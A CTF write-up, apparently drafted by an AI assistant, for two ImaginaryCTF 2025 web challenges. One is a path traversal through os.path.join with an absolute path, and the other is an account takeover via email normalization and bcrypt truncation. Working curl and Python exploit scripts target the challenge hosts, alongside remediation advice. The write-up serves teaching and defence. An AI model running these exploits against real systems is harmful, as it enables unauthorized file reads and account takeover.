# Imaginary CTF writeup 2025

## web/Codenames‑1

## Summary

This writeup explains the vulnerability in the `codenames-1` challenge, how it was exploited to read `/flag.txt`, and provides proof-of-concept (PoC) code and remediation suggestions.

**Short vuln description:** the server builds a path to a language wordlist using `os.path.join(WORDS_DIR, f"{language}.txt")` but only blocks values containing a dot (`.`). Supplying an absolute path like `/flag` bypasses the blacklist; `os.path.join` treats an absolute second argument as taking precedence and the server opens `/flag.txt`. The read contents are subsequently used as the game wordlist and are leaked to connected players.

---

## Vulnerable code (key excerpts) and analysis

Below are the most relevant snippets (simplified and annotated) from `app.py`.

 `create_game` (wordlist selection)

```py
language = request.form.get('language', None)
if not language or '.' in language:
    language = LANGUAGES[0] if LANGUAGES else None

# load words for this language
word_list = []
if language:
    wl_path = os.path.join(WORDS_DIR, f"{language}.txt")
    try:
        with open(wl_path) as wf:
            word_list = [line.strip() for line in wf if line.strip()]
    except IOError as e:
        print(e)
        word_list = []
```

**Why this is vulnerable:**

* The only validation is `'.' in language` and `not language`. That blocks strings with dots (like `../etc/passwd`) but *does not block absolute paths* like `/flag` which contain no dots.
* In Python, `os.path.join('words', '/flag.txt')` returns `'/flag.txt'` — the absolute second argument overrides the initial component. So by submitting `language=/flag`, the server ends up opening `/flag.txt`.

### Where the flag leaks into the game

After reading the `word_list`, the server selects 25 items and stores them into `game['board']`. Later, when both players connect by WebSocket, the server emits the `start_game` event and includes `board` in the payload. The client renders the board words on the HTML page. Therefore any file read as the word list (including `/flag.txt`) gets shown to players.

Key emission point (simplified):

```py
payload_common = {
    'board': game['board'],
    'revealed': game['revealed'],
    ...
}
# emit start_game to each player's socket id
emit('start_game', data, room=sid)
```

Once the board is sent, the flag text appears as one or more board cells that you can simply read from the game page.

---

## Exploit strategy (high level)

1. Create a game while setting the `language` form value to `/flag` (no dot). The server will open `/flag.txt` as the wordlist.
2. Ensure two players connect (two logged-in clients open the `/game/<code>` URL). When both players connect, the server emits `start_game` and sends the board (which now contains the flag) to both players.

Two practical ways to trigger it:

* Manual: create and join the game from two browser windows (normal + incognito). Use the browser devtools to change the `<select>` value for `language` or craft the POST directly.
* Automated: use scripts to register/login two accounts and connect two socket.io clients that carry the Flask session cookie; listen for `start_game` and print the board.

---

## PoC — manual (browser) steps (quick)

1. Visit `/register` and create two accounts (account A and account B). Passwords must be at least 8 characters.
2. In account A: go to **Lobby** → open Developer Tools → edit the `<select id="language" name="language">` to add or change an option's `value` to `/flag` and choose it.
3. Click **Create Game**. You'll be redirected to `/game/<CODE>`.
4. In account B (other browser or incognito): go to Lobby and **Join Game** using `<CODE>`.
5. When both clients are connected the page will switch to the board — the board cells will include the flag text read from `/flag.txt`.

---

## PoC — command-line + small automation (curl + parsing)

You can create the game by POSTing `language=/flag` with your authenticated cookie. Example outline (replace `BASE` with the challenge URL):

```bash
BASE="http://codenames-1.chal.imaginaryctf.org"
# Register account A and save cookies
curl -c cookiesA.txt -L -d "username=alice&password=alicepass1" "$BASE/register"

# Create game with language=/flag (capture redirect)
curl -b cookiesA.txt -c cookiesA.txt -D headers.txt -X POST -d "language=/flag" "$BASE/create_game" -o /dev/null -s
# parse Location header for /game/<CODE>
grep -i '^Location:' headers.txt
```

After you obtain `<CODE>`, you still need a second client (browser or automated socket client) to join the game and let the server emit `start_game`.

---

## PoC — full Python script (automated)

This script registers two accounts, creates the game with `language=/flag`, has the second account join, and attaches two `python-socketio` clients that use each session cookie. When the server emits `start_game` both clients will receive the board and the script will print it.

> Requirements: `pip install requests python-socketio`

```py
#!/usr/bin/env python3
"""
PoC: create game with /flag and capture start_game payloads.
Usage: edit BASE variable and run. Requires requests and python-socketio.
"""
import time
import requests
import socketio
import urllib.parse

BASE = 'http://codenames-1.chal.imaginaryctf.org'  # <-- change to target

# helper to register/login (register may succeed or fail if user exists)
def register_and_login(sess, username, password):
    sess.post(f'{BASE}/register', data={'username': username, 'password': password}, allow_redirects=True)
    # ensure logged in by navigating to lobby
    sess.get(f'{BASE}/lobby')

# build cookie header string from requests session
def cookie_header_from_session(sess):
    cj = sess.cookies.get_dict()
    return '; '.join(f'{k}={v}' for k, v in cj.items())

# 1) Register two users
s1 = requests.Session()
s2 = requests.Session()
register_and_login(s1, 'poc_user_a', 'pocpass123')
register_and_login(s2, 'poc_user_b', 'pocpass456')

# 2) Create game with language=/flag (do not follow redirect to capture Location)
resp = s1.post(f'{BASE}/create_game', data={'language': '/flag'}, allow_redirects=False)
loc = resp.headers.get('Location')
if not loc:
    print('Failed to create game or capture location header')
    raise SystemExit(1)
# Location is typically like /game/ABC123
code = loc.split('/game/')[-1].strip()
print('Game code:', code)

# 3) Have second user join the game
s2.post(f'{BASE}/join_game', data={'code': code}, allow_redirects=True)

# 4) connect two socket.io clients using each session cookie
sio1 = socketio.Client()
sio2 = socketio.Client()

flag_holder = {'p1': None, 'p2': None}

def make_on_start(name):
    def on_start(data):
        print(f'[{name}] start_game payload received')
        board = data.get('board')
        if board:
            print(f'[{name}] board words:')
            for w in board:
                print('  ', w)
        flag_holder[name] = data
    return on_start

sio1.on('start_game', make_on_start('p1'))
sio2.on('start_game', make_on_start('p2'))

cookie1 = cookie_header_from_session(s1)
cookie2 = cookie_header_from_session(s2)

# connect (attach query ?code=<CODE> like the JS client does)
url = BASE + f'?code={urllib.parse.quote(code)}'
print('connecting clients...')
sio1.connect(url, headers={'Cookie': cookie1})
sio2.connect(url, headers={'Cookie': cookie2})

# wait for events
try:
    time.sleep(6)
finally:
    sio1.disconnect()
    sio2.disconnect()

print('done')
```

**Notes & gotchas:**

* The Flask session cookie name is application-specific, but `requests.Session()` will hold whatever cookie Flask sets; building the `Cookie:` header from `sess.cookies` is robust.
* If an account already exists, `/register` may redirect to login; the script attempts to access `/lobby` afterward to establish session state.
* Some CTF instances may rate-limit or use additional protections; adjust wait times and retry logic accordingly.

---

## Root cause & fixes

**Root cause:** unsafe path construction combined with a blacklist-style filter that only checks for dots. `os.path.join` treats an absolute path component as overriding earlier components, allowing an attacker to escape the intended directory by supplying an absolute path.

**Immediate fixes:**

1. **Allowlist languages:** instead of accepting arbitrary `language` strings from users, only accept values already present in `LANGUAGES` (the file list in `words/`). Example:

```py
language = request.form.get('language')
if language not in LANGUAGES:
    abort(400)
```

2. **Use safe path resolution:** construct the path, then call `resolve()` and verify it sits under the intended directory. Example (pathlib):

```py
from pathlib import Path
WORDS_DIR_PATH = Path(WORDS_DIR).resolve()
candidate = (WORDS_DIR_PATH / f"{language}.txt").resolve()
if not str(candidate).startswith(str(WORDS_DIR_PATH) + os.sep):
    abort(400)
```

3. **Do not read arbitrary files:** avoid reading any user-supplied path. Prefer to map user-supplied tokens to known filenames on the server.

4. **Avoid blacklists:** never rely on negative checks (`if '.' in input`) for security. Use whitelists or canonicalization + containment checks.

---


## Appendix: short notes about other interesting code bits

* The app uses a `BOT_SECRET_PREFIX` randomly generated at startup and passes it to the Selenium bot; bots are registered when their `password` starts with that prefix. This is unrelated to the path vuln but useful to know when interacting with bot-related endpoints.
* The `add_bot` endpoint simply spawns `bot.py` (server-side); in some CTF instances you can trigger internal bots, but here the easiest path was the language trick.

---

## Final notes

This is a classic example of path confusion and why allowlists + canonicalization are essential. If you want, I can:

* Produce a shorter 1‑page report for a CTF writeup page.
* Generate a PDF from this markdown.
* Add inline annotated screenshots (if you give screenshots).


## Flag
```ictf{common_os_path_join_L_b19d35ca}```
---

#
---

# web/Passwordless 

**Challenge:** `passwordless` (by Ciaran)

**Summary / TL;DR**

A logic bug combined with bcrypt's 72‑byte password truncation lets an attacker register a user **whose stored normalized email is short (e.g. `aa@gmail.com`)** while the *raw* registration email contains a very long local part (dots + `a` etc.). Because the app constructs the initial password as `req.body.email + randomBytes(...)` and bcrypt **truncates the password to 72 bytes**, if the raw email is long enough the random suffix is *never* included in the hashed password. The attacker therefore knows the actual password (the long raw email string) and can log in using the *normalized* (short) email — which gives access to the dashboard where the flag is rendered.

---

## Vulnerable code (relevant excerpts)

**index.js** (important parts annotated):

```js
// db: in-memory sqlite
db.run('CREATE TABLE users (email TEXT UNIQUE, password TEXT)')

// Registration route
app.post('/user', limiter, (req, res, next) => {
    if (!req.body) return res.redirect('/login')

    const nEmail = normalizeEmail(req.body.email)

    if (nEmail.length > 64) {
        req.session.error = 'Your email address is too long'
        return res.redirect('/login')
    }

    // BUG: initial password *uses the raw req.body.email* (not the normalized one)
    const initialPassword = req.body.email + crypto.randomBytes(16).toString('hex')
    bcrypt.hash(initialPassword, 10, function (err, hash) {
        // store normalized email and hashed password
        const query = "INSERT INTO users VALUES (?, ?)"
        db.run(query, [nEmail, hash], (err) => { ... })
    })
})

// Login route
app.post('/session', limiter, (req, res, next) => {
    const email = normalizeEmail(req.body.email)
    const password = req.body.password
    authenticate(email, password, (err, user) => { ... })
})

function authenticate(email, password, fn) {
    db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {
        if (user && bcrypt.compareSync(password, user.password)) {
            return fn(null, user)
        } else {
            return fn(null, null)
        }
    });
}
```

**dashboard.ejs** (shows flag directly):

```ejs
<span id="flag"><%- process.env.FLAG %></span>
```

---

## Root cause explained (step‑by‑step)

1. **Normalization mismatch**: the code *stores* `nEmail = normalizeEmail(req.body.email)` in the DB but the initial password is constructed from the **raw** `req.body.email`. That mismatch is important.

2. **Normalize behaviour (Gmail canonicalization)**: `normalize-email` will canonicalize Gmail addresses by removing dots in the local part and lowercasing, so `a...a@gmail.com` (with many dots) normalizes to `aa@gmail.com`.

3. **Bcrypt truncation**: bcrypt implementations (like `bcrypt` npm package) only use the **first 72 bytes** of the password; anything after 72 bytes is ignored. This means if the data that *precedes* the random suffix is ≥ 72 bytes, the random suffix is discarded before hashing.

4. **Combined effect**: register with a raw email whose local part contains many characters/dots so that `req.body.email.length >= 72`. The server stores `nEmail` which becomes a short address (e.g. `aa@gmail.com`). The hashed password equals `bcrypt(raw_email + random)` truncated to 72 bytes, but if `raw_email.length >= 72` the result is effectively `bcrypt(first_72_bytes_of_raw_email)`. The attacker knows this first 72 characters (they chose the email), so they know the password.

5. **Login path**: to log in you provide the **normalized** email (short) as the `email` parameter (so `db.get` finds the same user) and the **raw** long email as the `password`. `bcrypt.compareSync` checks the password and it succeeds.

---

## Reproduction & PoC

> Replace `HOST` with the real target (for local testing use `http://localhost:3000`). The server enforces a rate limit (10 requests/min) so space attempts accordingly.

## Manual steps (conceptual)

1. Register with a crafted email whose local part contains **many dots** so normalization collapses them:

```
Register email:  a............................................................................a@gmail.com
```

2. Login with:

```
Email:    aa@gmail.com            # normalized email
Password: a............................................................................a@gmail.com  # the raw email you registered with
```

If successful, `/dashboard` will show the flag.

## `curl` PoC (example)

```bash
# 1) Build a long dotted email (here 80 dots in local part)
LONG_EMAIL=$(python3 - <<'PY'
print('a' + '.'*80 + 'a' + '@gmail.com')
PY
)
NORMALIZED_EMAIL="aa@gmail.com"   # result after normalize-email (Gmail dot removal)

# 2) Register (save cookies)
curl -s -c cookies.txt -X POST 'http://HOST/user' -d "email=${LONG_EMAIL}" -L

# 3) Login using normalized email but the long raw email as password
curl -s -b cookies.txt -c cookies.txt -X POST 'http://HOST/session' -d "email=${NORMALIZED_EMAIL}" -d "password=${LONG_EMAIL}" -L

# 4) Fetch dashboard (flag rendered in page)
curl -s -b cookies.txt 'http://HOST/dashboard' | sed -n '1,200p'
```

## Python PoC (requests)

```python
# poc_exploit.py
import requests

HOST = 'http://HOST'          # change this
s = requests.Session()

# craft a long dotted local part that will normalize to 'aa@gmail.com'
long_email = 'a' + ('.' * 80) + 'a@gmail.com'
norm_email = 'aa@gmail.com'

# register
r = s.post(f'{HOST}/user', data={'email': long_email})
print('register:', r.status_code)

# login
r = s.post(f'{HOST}/session', data={'email': norm_email, 'password': long_email})
print('login:', r.status_code)

# get dashboard
r = s.get(f'{HOST}/dashboard')
print(r.text)
```

---

## Why normalization/dots matter (short example)

* Submitted raw: `a . . . . a @gmail.com` (dots in local part)
* `normalize-email` (Gmail normalization) removes all dots in local part → `aa@gmail.com`.
* The DB stores `aa@gmail.com` (short) while the initial password was computed from the raw dotted form. Because the attacker controls the raw dotted form and it is long enough to push the random suffix past bcrypt's 72-byte cutoff, the attacker knows the hashed password's effective input and can use it to authenticate.

---

## Root cause & lessons

*Root causes:*

* Using **user-controlled input** (the raw email) directly in password material is dangerous. Input normalization and canonicalization can change the value used for lookup.
* **Inconsistent usage**: using normalized email for DB key but raw email for password generation created a mismatch that an attacker can manipulate.
* **Bcrypt truncation** is a well-known pitfall that must be kept in mind: any code that relies on secret bytes appended to a user-controlled prefix must ensure the secret is actually included in the hashed input.


---

## Impact and mitigation summary

* **Impact:** attacker-controlled account creation leads to account takeover for the normalized address they caused to be stored. In this challenge the dashboard prints `process.env.FLAG`, so account takeover yields the flag.
* **Mitigation:** stop including user-controlled strings in passwords, validate `normalizeEmail` results, and be mindful of hashing algorithm limits (72 bytes for bcrypt).

---

## Appendix — helpful references & notes

* `bcrypt` truncation behavior is a common gotcha (72 bytes). If you rely on secrets appended to user input ensure you place the secret *before* the user input or use a KDF/HMAC construction that does not silently truncate.
* `normalize-email` uses canonicalization rules (gmail dot removal, lowercasing). Always validate its output.

---

## Closing notes

If you want I can:

* produce a downloadable file (`passwordless_writeup.md`) for you (I can create it here in the canvas),
* convert this writeup to a polished PDF, or
* adapt the PoC into a Burp intruder list or a single-shot exploit that automatically extracts the flag from a remote host (rate-limit aware).

Tell me which output you prefer.

